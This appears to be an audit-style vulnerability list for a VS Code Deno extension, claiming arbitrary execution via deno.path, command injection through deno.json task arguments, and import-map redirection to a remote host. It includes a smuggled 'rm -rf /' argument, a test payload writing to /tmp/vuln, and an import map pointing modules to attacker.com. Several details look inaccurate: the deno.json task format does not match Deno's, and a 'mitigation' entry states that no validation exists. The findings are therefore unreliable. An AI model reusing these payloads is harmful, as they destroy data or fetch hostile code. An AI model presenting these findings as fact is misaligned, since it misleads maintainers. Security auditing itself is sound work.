# Updated Vulnerability List

## Vulnerability 1: Arbitrary Code Execution via Malicious deno.path Configuration
### Description
The extension uses the user-configurable `deno.path` setting to locate the Deno executable. If this path is set to a malicious executable (e.g., through a symlink attack or direct configuration manipulation), the extension will execute it when starting the language server. The `getDenoCommandPath` function validates file existence but does not verify that the file is an actual Deno binary or trusted executable. An attacker can exploit this by pointing `deno.path` to a malicious script, leading to arbitrary code execution.

#### Steps to Trigger
1. Configure `deno.path` to point to a malicious executable (e.g., `C:\malicious\fake_deno.exe`).
2. Restart the extension or run a command requiring Deno (e.g., `Deno: Enable`).
3. The malicious executable executes with the permissions of the user's VS Code process.

### Impact
An attacker can execute arbitrary code with the privileges of the VS Code process, potentially leading to system compromise.

### Vulnerability Rank
Critical

#### Currently Implemented Mitigations
- The `getDenoCommandPath` function checks if the specified path exists.

#### Missing Mitigations
- No validation that the file is a trusted Deno executable.
- No checks for symbolic links or path traversal in `deno.path`.

#### Preconditions
- The attacker has write access to VS Code settings to configure `deno.path`.

#### Source Code Analysis
- **client/src/commands.ts**: `startLanguageServer` uses `getDenoCommandPath` to determine the Deno executable.
- **client/src/util.ts**: `getDenoCommandPath` resolves `deno.path` but only checks existence, not integrity.

#### Security Test Case
1. Create a malicious script (e.g., `fake_deno.sh` on Linux/macOS or `fake_deno.exe` on Windows) that writes to a file in `/tmp/pwned` (or `C:\pwned`).
2. Set `deno.path` to the malicious script’s path via VS Code settings.
3. Restart VS Code or run a Deno command (e.g., enable Deno).
4. Check if the malicious script executed and created `/tmp/pwned` (or `C:\pwned`).

## Vulnerability 2: Command Injection via Unsanitized Task Definitions in deno.json
### Description
The extension executes tasks defined in `deno.json` without validating the command-line arguments. Attackers can craft malicious `args` fields in task definitions to execute arbitrary commands via shell metacharacters (e.g., `; rm -rf /`). The `buildDenoTask` function directly passes user-provided arguments to the Deno command without sanitization.

#### Steps to Trigger
1. Create a `deno.json` with a task containing malicious arguments:
```json
{
  "tasks": [
    {
      "name": "malicious_task",
      "command": "run",
      "args": ["--allow-all", "malicious.ts; rm -rf /"]
    }
  ]
}
```
2. Run the task via the VS Code tasks panel.

### Impact
Arbitrary commands can execute with permissions tied to the user’s workspace, potentially leading to data destruction or code execution.

### Vulnerability Rank
Critical

#### Currently Implemented Mitigations
- No input validation or sanitization for task arguments.

#### Missing Mitigations
- No checks for shell metacharacters in task arguments.

#### Preconditions
- The workspace contains a malicious `deno.json` file.

#### Source Code Analysis
- **client/src/tasks.ts**: `buildDenoTask` directly uses `definition.args` in the command line.
- **client/src/tasks_sidebar.ts**: The language server’s task responses are used without validation.

#### Security Test Case
1. Create a `deno.json` with a task like:
   ```json
   {
     "tasks": [{
       "name": "test",
       "command": "run",
       "args": ["--allow-all", "test.ts; echo 'VULN' > /tmp/vuln"]
     }]
   }
   ```
2. Run the task and check if `/tmp/vuln` (or equivalent) is created.

## Vulnerability 3: Malicious Module Imports via Unvalidated Import Maps
### Description
The extension processes import maps from `deno.json` without validating URLs, allowing attackers to redirect module imports to malicious remote URLs. A crafted `importMap` field in the configuration can trick the language server into fetching and executing hostile modules (e.g., `https://attacker.com/malicious.js`).

#### Steps to Trigger
1. Create a malicious `import_map.json` with a redirect:
```json
{
  "imports": {
    "https://deno.land/x/": "https://attacker.com/malicious/"
  }
}
```
2. Configure `deno.json` to reference it:
```json
{ "importMap": "./import_map.json" }
```
3. The extension loads modules from `attacker.com`, which could execute malicious code.

### Impact
Execution of remote malicious modules with Deno permissions, potentially leading to code execution or data exfiltration.

### Vulnerability Rank
High

#### Currently Implemented Mitigations
- None; the import map is directly passed to the language server.

#### Missing Mitigations
- No validation of URLs in import maps.

#### Preconditions
- The workspace includes a malicious `deno.json` or `import_map.json`.

#### Source Code Analysis
- **client/src/extension.ts**: The Deno configuration’s `importMap` is passed to the server without validation.
- **typescript-deno-plugin/src/index.ts**: The plugin uses `importMap` settings without checks.

#### Security Test Case
1. Create an import map redirecting a module to a malicious server.
2. Monitor network requests to see if Deno fetches from the attacker’s URL.
